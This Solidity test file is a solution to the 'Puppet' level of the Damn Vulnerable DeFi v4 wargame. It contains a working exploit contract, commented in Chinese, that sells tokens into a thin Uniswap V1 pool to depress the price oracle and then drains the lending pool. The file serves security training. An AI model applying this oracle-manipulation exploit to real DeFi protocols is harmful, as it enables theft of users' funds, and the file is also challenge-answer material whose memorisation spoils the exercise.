// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";

/**
 * 攻击思路：操纵 PuppetPool 的 Oracle 价格
 * - Oracle: price = uniswap.balance / token.balanceOf(uniswap)
 * - 向 Uniswap 大量卖出 DVT 会压低价格，从而降低借款所需的 ETH 抵押
 * - 步骤：1) 批准 Uniswap 2) 卖出全部 DVT 3) 用 ETH 借出池中所有 DVT 4) 转给 recovery
 */
contract PuppetExploit {
    receive() external payable {}

    function run(
        IUniswapV1Exchange uniswapV1Exchange,
        PuppetPool lendingPool,
        DamnValuableToken token,
        address recovery
    ) external payable {
        uint256 deadline = block.timestamp * 2;

        // 1. 从玩家转入初始 DVT
        uint256 tokenBalance = token.balanceOf(msg.sender);
        token.transferFrom(msg.sender, address(this), tokenBalance);

        // 2. 批准 Uniswap 使用我们的 DVT
        token.approve(address(uniswapV1Exchange), type(uint256).max);
        console.log("address(this).balance", address(this).balance); // 25000000000000000000 from run{msg.value}

        // 3. 卖出全部 DVT 压低 Oracle 价格（合约已通过 receive 接收玩家附带的 ETH）
        uint256 ethReceived = uniswapV1Exchange.tokenToEthSwapInput(tokenBalance, 1, deadline);
        console.log("ethReceived", ethReceived);                       // 9900695134061569016  余额9.9个eth
        console.log("address(this).balance", address(this).balance);   // 34900695134061569016 余额34.9个eth

        // 4. 迭代借出直到池空（利用玩家 ETH + 卖出获得的 ETH）
        while (token.balanceOf(address(lendingPool)) > 0) { // 为什么这里要判断池中还有DVT？因为如果池中没有DVT，则玩家无法借出DVT
            uint256 ethToBorrowOneToken = lendingPool.calculateDepositRequired(1e18); // DVT在pool中的价格
            uint256 poolBalance = token.balanceOf(address(lendingPool)); // pool中DVT的数量
            uint256 tokenWeCanBorrow = (address(this).balance * 1e18) / ethToBorrowOneToken; // 玩家可以借出的DVT数量
            uint256 borrowAmount = poolBalance < tokenWeCanBorrow ? poolBalance : tokenWeCanBorrow; // 玩家实际可以借出的DVT数量
            if (borrowAmount == 0) break;
            console.log("poolBalance", poolBalance);                 // 100000000000000000000000   1_000_000 DVT
            console.log("tokenWeCanBorrow", tokenWeCanBorrow);       // 177482250000000130675696   1_774_822 DVT
            console.log("ethToBorrowOneToken", ethToBorrowOneToken); // 196643298887982            0.000196643298887982 ETH

            uint256 depositRequired = lendingPool.calculateDepositRequired(borrowAmount); // 玩家需要抵押的ETH数量
            // 玩家花depositRequired ETH借出borrowAmount DVT，然后转给合约
            lendingPool.borrow{value: depositRequired}(borrowAmount, address(this));
            console.log("mid token.balanceOf(address(this))", token.balanceOf(address(this)));
        }

        console.log("token.balanceOf(address(this))", token.balanceOf(address(this)));

        // 5. 转给 recovery
        token.transfer(recovery, token.balanceOf(address(this)));
    }
}

contract PuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPrivateKey;

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    IUniswapV1Factory uniswapV1Factory;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPrivateKey) = makeAddrAndKey("player");

        startHoax(deployer);

        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy a exchange that will be used as the factory template
        IUniswapV1Exchange uniswapV1ExchangeTemplate =
            IUniswapV1Exchange(deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV1Exchange.json")));

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory = IUniswapV1Factory(deployCode("builds/uniswap/UniswapV1Factory.json"));
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        // Deploy token to be traded in Uniswap V1
        token = new DamnValuableToken();

        // Create a new exchange for the token
        uniswapV1Exchange = IUniswapV1Exchange(uniswapV1Factory.createExchange(address(token)));

        // Deploy the lending pool
        lendingPool = new PuppetPool(address(token), address(uniswapV1Exchange));

        // Add initial token and ETH liquidity to the pool
        token.approve(address(uniswapV1Exchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            block.timestamp * 2 // deadline
        );

        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapV1Exchange.factoryAddress(), address(uniswapV1Factory));
        assertEq(uniswapV1Exchange.tokenAddress(), address(token));
        assertEq(
            uniswapV1Exchange.getTokenToEthInputPrice(1e18),
            _calculateTokenToEthInputPrice(1e18, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
        );
        assertEq(lendingPool.calculateDepositRequired(1e18), 2e18);
        assertEq(lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppet() public checkSolvedByPlayer {
        PuppetExploit exploit = new PuppetExploit();

        // 1. 批准 Exploit 合约使用玩家的 DVT
        token.approve(address(exploit), PLAYER_INITIAL_TOKEN_BALANCE);

        // 2. 执行攻击（玩家附带 ETH 调用，单笔交易完成）
        exploit.run{value: PLAYER_INITIAL_ETH_BALANCE}(uniswapV1Exchange, lendingPool, token, recovery);
    }

    // Utility function to calculate Uniswap prices
    function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
        private
        pure
        returns (uint256)
    {
        return (tokensSold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokensSold * 997);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All tokens of the lending pool were deposited into the recovery account
        assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
        assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
